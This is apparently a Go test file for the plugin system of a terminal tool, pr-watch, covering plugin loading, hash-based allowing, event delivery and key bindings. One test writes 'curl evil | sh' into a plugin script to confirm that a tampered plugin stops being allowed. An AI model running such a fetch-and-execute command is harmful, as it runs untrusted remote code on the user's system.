package main

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	tea "charm.land/bubbletea/v2"
)

// writePlugin makes a plugin folder: its plugin.json, and executable scripts by name.
func writePlugin(t *testing.T, dir, name, manifest string, scripts map[string]string) string {
	t.Helper()
	p := filepath.Join(dir, name)
	os.MkdirAll(p, 0o755)
	if manifest != "" {
		os.WriteFile(filepath.Join(p, "plugin.json"), []byte(manifest), 0o644)
	}
	for file, body := range scripts {
		os.WriteFile(filepath.Join(p, file), []byte("#!/bin/sh\n"+body+"\n"), 0o755)
	}
	return p
}

// recorder is a script that appends what it got on stdin to $PLUGIN_OUT, outside its folder (writing into its own
// folder would change its hash, and unallow it).
const recorder = `cat >> "$PLUGIN_OUT"; echo >> "$PLUGIN_OUT"`

func received(t *testing.T, path string) []pluginEvent {
	t.Helper()
	b, _ := os.ReadFile(path)
	var out []pluginEvent
	for _, l := range strings.Split(strings.TrimSpace(string(b)), "\n") {
		if l == "" {
			continue
		}
		var ev pluginEvent
		if err := json.Unmarshal([]byte(l), &ev); err != nil {
			t.Fatalf("not JSON: %q", l)
		}
		out = append(out, ev)
	}
	return out
}

// drain runs a command and what it batches, sending each message back to the model, as bubbletea does.
func drain(m *model, cmd tea.Cmd) {
	if cmd == nil {
		return
	}
	msg := cmd()
	if batch, ok := msg.(tea.BatchMsg); ok {
		for _, c := range batch {
			drain(m, c)
		}
		return
	}
	m.Update(msg)
}

func byName(ps []plugin) map[string]plugin {
	out := map[string]plugin{}
	for _, p := range ps {
		out[p.Name] = p
	}
	return out
}

// A plugin is a folder with a plugin.json. It runs once allowed, and stops when any of its files change.
func TestLoadPlugins(t *testing.T) {
	dir := t.TempDir()
	store := Store{Dir: t.TempDir()}
	confetti := writePlugin(t, dir, "confetti", `{"api": 1, "description": "confetti on merges", "on": ["merged"], "run": ["./fire.sh"],
		"keys": [{"key": "C", "does": "fire the cannon", "run": ["./fire.sh"]}]}`, map[string]string{"fire.sh": "echo boom"})
	writePlugin(t, dir, "broken", `{"api": 1, "on": "merged"}`, nil)
	writePlugin(t, dir, "future", `{"api": 2, "on": ["merged"], "run": ["x"]}`, nil)
	writePlugin(t, dir, "notes", "", map[string]string{"todo.sh": ""})
	writePlugin(t, dir, ".hidden", `{"api": 1, "on": ["merged"], "run": ["x"]}`, nil)
	writePlugin(t, dir, "typo", `{"api": 1, "on": ["merge"], "run": ["x"]}`, nil)
	elsewhere := writePlugin(t, t.TempDir(), "clone", `{"api": 1, "keys": [{"key": "L", "does": "log", "run": ["x"]}]}`, nil)
	os.Symlink(elsewhere, filepath.Join(dir, "linked"))
	os.WriteFile(filepath.Join(dir, "README"), []byte("not a plugin"), 0o644)

	ps := loadPlugins(dir, store.AllowedPlugins())
	var names []string
	for _, p := range ps {
		names = append(names, p.Name+": "+p.state())
	}
	want := []string{
		"broken: broken: plugin.json: cannot unmarshal string into Go struct field plugin.on of type []string",
		"confetti: new, not allowed yet",
		"future: broken: it's for api 2; this pr-watch speaks api 1",
		"linked: new, not allowed yet",
		"notes: broken: no plugin.json",
		"typo: new, not allowed yet",
	}
	if strings.Join(names, "\n") != strings.Join(want, "\n") {
		t.Errorf("plugins:\n%s\nwant:\n%s", strings.Join(names, "\n"), strings.Join(want, "\n"))
	}
	if w := byName(ps)["typo"].Warn; len(w) != 1 || !strings.Contains(w[0], `no "merge" event`) {
		t.Errorf("typo warnings = %q", w)
	}

	p := byName(ps)["confetti"]
	store.AllowPlugin("confetti", p.Hash)
	if p := byName(loadPlugins(dir, store.AllowedPlugins()))["confetti"]; !p.Allowed {
		t.Errorf("allowed, it's %s", p.state())
	}
	os.MkdirAll(filepath.Join(confetti, ".git"), 0o755)
	os.WriteFile(filepath.Join(confetti, ".git", "FETCH_HEAD"), []byte("abc"), 0o644)
	os.WriteFile(filepath.Join(confetti, ".DS_Store"), []byte("finder"), 0o644)
	if p := byName(loadPlugins(dir, store.AllowedPlugins()))["confetti"]; !p.Allowed {
		t.Errorf("a git fetch or Finder unallowed it: %s", p.state())
	}
	os.WriteFile(filepath.Join(confetti, "fire.sh"), []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755)
	if p := byName(loadPlugins(dir, store.AllowedPlugins()))["confetti"]; p.Allowed || !p.Changed {
		t.Errorf("after its script changed: allowed %v, changed %v", p.Allowed, p.Changed)
	}
	store.AllowPlugin("confetti", "")
	if p := byName(loadPlugins(dir, store.AllowedPlugins()))["confetti"]; p.Allowed || p.Changed {
		t.Errorf("denied: %s", p.state())
	}
}

// pluginModel has the test model's lists, and the plugins in dir, allowed but the ones named.
func pluginModel(t *testing.T, dir string, notAllowed ...string) *model {
	t.Helper()
	m := testModel(t)
	m.auto = false // no sends: drain must only run plugins
	m.w.me = "me"
	m.cfg.PluginsDir = dir
	for _, p := range loadPlugins(dir, nil) {
		if p.Err == "" && !slices.Contains(notAllowed, p.Name) {
			m.store.AllowPlugin(p.Name, p.Hash)
		}
	}
	drain(m, m.loadPluginsCmd())
	return m
}

// A poll's merges and events reach the plugins that asked for them, as JSON on stdin; a plugin you haven't allowed
// doesn't run.
func TestPluginsGetThePollsNews(t *testing.T) {
	dir := t.TempDir()
	out := filepath.Join(t.TempDir(), "got.jsonl")
	t.Setenv("PLUGIN_OUT", out)
	writePlugin(t, dir, "rec", `{"api": 1, "on": ["merged", "comment"], "run": ["./rec.sh"]}`, map[string]string{"rec.sh": recorder + "; echo noted"})
	writePlugin(t, dir, "fails", `{"api": 1, "on": ["closed"], "run": ["./fail.sh"]}`, map[string]string{"fail.sh": "echo oops >&2; exit 3"})
	writePlugin(t, dir, "unvetted", `{"api": 1, "on": ["*"], "run": ["./rec.sh"]}`, map[string]string{"rec.sh": recorder})
	m := pluginModel(t, dir, "unvetted")

	left := map[string]Stored{"2720": m.prs["2720"], "2740": m.prs["2740"]} // #2731 merged, #99 (one you reviewed) closed
	at := time.Date(2026, 1, 2, 10, 0, 0, 0, time.UTC)
	_, cmd := m.Update(pollMsg{PRs: left, Closed: []int{2731, 99}, Merged: []int{2731}, Events: []Event{
		{At: at, PR: 2720, Text: "comment by bob https://gh/pr/2720#c9"},
		{At: at, PR: 2720, Text: "ci-failed on abc: lint https://gh/pr/2720/checks"},
	}})
	drain(m, cmd)

	got := received(t, out)
	if len(got) != 2 {
		t.Fatalf("rec ran %d times, want 2 (merged, comment): %+v", len(got), got)
	}
	merged, comment := got[0], got[1]
	if merged.API != 1 || merged.Event != "merged" || merged.Repo != "acme/widgets" || merged.PR == nil ||
		*merged.PR != (pluginPR{Number: 2731, Title: "Ledger import", Branch: "ledger", Author: "me", Role: "author"}) {
		t.Errorf("merged = %+v, pr %+v", merged, merged.PR)
	}
	if comment.Event != "comment" || comment.Text != "comment by bob" || comment.URL != "https://gh/pr/2720#c9" ||
		!comment.At.Equal(at) || comment.PR.Number != 2720 || comment.PR.Role != "author" {
		t.Errorf("comment = %+v, pr %+v", comment, comment.PR)
	}
	if !strings.Contains(m.store.read("events.log"), "plugin fails failed on closed #99: exit status 3: oops") {
		t.Errorf("the failure isn't in events.log:\n%s", m.store.read("events.log"))
	}

	ev := m.pollPluginEvents(pollMsg{Closed: []int{99}})
	if len(ev) != 1 || ev[0].Event != "closed" || ev[0].PR.Role != "reviewer" || ev[0].URL != "https://github.com/acme/widgets/pull/99" {
		t.Errorf("a PR you reviewed, closed before pr-watch listed it: %+v", ev)
	}
}

// What a plugin prints shows in the status line; why it failed, too.
func TestPluginDone(t *testing.T) {
	m := testModel(t)
	m.pluginDone(pluginDoneMsg{plugin: "rec", what: "merged #1", out: "noted"})
	if m.flash != "rec: noted" {
		t.Errorf("flash = %q", m.flash)
	}
	dir := t.TempDir()
	writePlugin(t, dir, "fails", `{"api": 1, "on": ["closed"], "run": ["./fail.sh"]}`, map[string]string{"fail.sh": "echo oops >&2; exit 3"})
	p := loadPlugins(dir, nil)[0]
	m.Update(pluginCmd(p, p.Run, pluginEvent{Event: "closed"}, "closed #1")())
	if m.flash != "plugin fails: exit status 3: oops" {
		t.Errorf("flash = %q", m.flash)
	}
}

// A plugin's key runs it with the PR on the focused row. pr-watch's own keys win, and so does the first plugin to
// want a key; the ? popup shows which.
func TestPluginKeys(t *testing.T) {
	dir := t.TempDir()
	out := filepath.Join(t.TempDir(), "got.jsonl")
	t.Setenv("PLUGIN_OUT", out)
	writePlugin(t, dir, "cannon", `{"api": 1, "keys": [{"key": "C", "does": "fire the cannon", "run": ["./rec.sh"]},
		{"key": "m", "does": "merge it", "run": ["./rec.sh"]}]}`, map[string]string{"rec.sh": recorder})
	writePlugin(t, dir, "copycat", `{"api": 1, "keys": [{"key": "C", "does": "fire another", "run": ["./rec.sh"]}]}`, map[string]string{"rec.sh": recorder})
	writePlugin(t, dir, "unvetted", `{"api": 1, "keys": [{"key": "U", "does": "untested", "run": ["./rec.sh"]}]}`, map[string]string{"rec.sh": recorder})
	m := pluginModel(t, dir, "unvetted")
	m.width, m.height = 150, 40

	press(m, "right") // To review: #2711 by bob
	_, cmd := m.Update(tea.KeyPressMsg{Code: 'c', ShiftedCode: 'C', Mod: tea.ModShift, Text: "C"})
	drain(m, cmd)
	for _, k := range []string{"m", "U"} {
		if _, cmd := m.Update(tea.KeyPressMsg{Code: rune(k[0]), Text: k}); cmd != nil {
			t.Errorf("%s ran something", k)
		}
	}
	got := received(t, out)
	if len(got) != 1 || got[0].Event != "key" || got[0].Key != "C" || got[0].PR == nil ||
		*got[0].PR != (pluginPR{Number: 2711, Title: "Add reconciliation", URL: "https://gh/pr/2711", Author: "bob", Role: "reviewer"}) {
		t.Fatalf("C sent %+v", got)
	}

	typeIn(m, "?")
	v := screen(m)
	if os.Getenv("PR_WATCH_SHOW_VIEW") != "" {
		t.Logf("\n%s", v)
	}
	for _, want := range []string{"Plugins", "fire the cannon · cannon", "merge it · cannon: pr-watch's key",
		"fire another · copycat: cannon's key", "unvetted is new: pr-watch plugins allow unvetted"} {
		if !strings.Contains(v, want) {
			t.Errorf("the popup lacks %q:\n%s", want, v)
		}
	}
	if !lineWith(v, "Move", "Find") {
		t.Errorf("the plugins took the popup's second column:\n%s", v)
	}
}

// A plugin new or changed since you allowed it is pointed out once, with how to allow it.
func TestNewPluginsAreSaidOnce(t *testing.T) {
	dir := t.TempDir()
	writePlugin(t, dir, "cannon", `{"api": 1, "on": ["merged"], "run": ["./x.sh"]}`, map[string]string{"x.sh": "true"})
	m := testModel(t)
	m.cfg.PluginsDir = dir
	drain(m, m.loadPluginsCmd())
	if m.flash != "plugin cannon is new: `pr-watch plugins allow cannon` lets it run" {
		t.Errorf("flash = %q", m.flash)
	}
	m.flash = ""
	drain(m, m.loadPluginsCmd())
	if m.flash != "" {
		t.Errorf("said again: %q", m.flash)
	}
	m.store.AllowPlugin("cannon", m.plugins[0].Hash)
	os.WriteFile(filepath.Join(dir, "cannon", "x.sh"), []byte("#!/bin/sh\nfalse\n"), 0o755)
	drain(m, m.loadPluginsCmd())
	if !strings.HasPrefix(m.flash, "plugin cannon changed:") {
		t.Errorf("flash = %q", m.flash)
	}
}

// Something a plugin leaves running in the background doesn't hold it up.
func TestPluginBackgroundChild(t *testing.T) {
	dir := t.TempDir()
	writePlugin(t, dir, "bg", `{"api": 1, "on": ["merged"], "run": ["./bg.sh"]}`, map[string]string{"bg.sh": "sleep 3 & echo started"})
	p := loadPlugins(dir, nil)[0]
	start := time.Now()
	out, _, err := runPlugin(p, p.Run, pluginEvent{Event: "merged"})
	if err != nil || strings.TrimSpace(out) != "started" || time.Since(start) > 2500*time.Millisecond {
		t.Errorf("out %q, err %v, after %s", out, err, time.Since(start))
	}
}

func TestPluginsCommand(t *testing.T) {
	dir := t.TempDir()
	out := filepath.Join(t.TempDir(), "got.jsonl")
	t.Setenv("PLUGIN_OUT", out)
	writePlugin(t, dir, "cannon", `{"api": 1, "description": "confetti on merges", "on": ["merged"], "run": ["./rec.sh"],
		"keys": [{"key": "C", "does": "fire the cannon", "run": ["./rec.sh", "now"]}]}`, map[string]string{"rec.sh": recorder + `; echo "fired $*"`})
	writePlugin(t, dir, "broken", `{"api": 1}`, nil)
	store := Store{Dir: t.TempDir()}
	cfg := Config{Repo: "acme/widgets", PluginsDir: dir}
	run := func(args ...string) (string, error) {
		var b bytes.Buffer
		err := pluginsCommand(args, cfg, store, &b)
		return b.String(), err
	}

	list, _ := run()
	for _, want := range []string{"cannon  new, not allowed yet", "confetti on merges", "on merged: ./rec.sh", "key C, fire the cannon: ./rec.sh now",
		`broken  broken: neither "on" nor "keys": nothing would run it`} {
		if !strings.Contains(list, want) {
			t.Errorf("the list lacks %q:\n%s", want, list)
		}
	}
	if _, err := run("allow", "broken"); err == nil {
		t.Error("allowed a broken plugin")
	}
	if _, err := run("allow", "nope"); err == nil || !strings.Contains(err.Error(), "no plugin nope") {
		t.Errorf("allow nope: %v", err)
	}

	tried, err := run("try", "cannon")
	if err != nil || !strings.Contains(tried, "stdout: fired") || !strings.Contains(tried, "isn't allowed") {
		t.Errorf("try: %v\n%s", err, tried)
	}
	if got := received(t, out); len(got) != 1 || got[0].Event != "merged" || got[0].PR.Number != 1 {
		t.Errorf("try sent %+v", got)
	}
	if tried, err := run("try", "cannon", "C"); err != nil || !strings.Contains(tried, "stdout: fired now") || !strings.Contains(tried, `"event":"key","key":"C"`) {
		t.Errorf("try C: %v\n%s", err, tried)
	}
	if _, err := run("try", "cannon", "comment"); err == nil {
		t.Error("tried an event it doesn't ask for")
	}

	if said, err := run("allow", "cannon"); err != nil || !strings.HasPrefix(said, "cannon  allowed\n") {
		t.Errorf("allow: %v\n%s", err, said)
	}
	if !byName(loadPlugins(dir, store.AllowedPlugins()))["cannon"].Allowed {
		t.Error("allow didn't stick")
	}
	run("deny", "cannon")
	if byName(loadPlugins(dir, store.AllowedPlugins()))["cannon"].Allowed {
		t.Error("deny didn't stick")
	}
	if _, err := run("frobnicate"); err == nil || !strings.Contains(err.Error(), "usage") {
		t.Errorf("unknown subcommand: %v", err)
	}
}
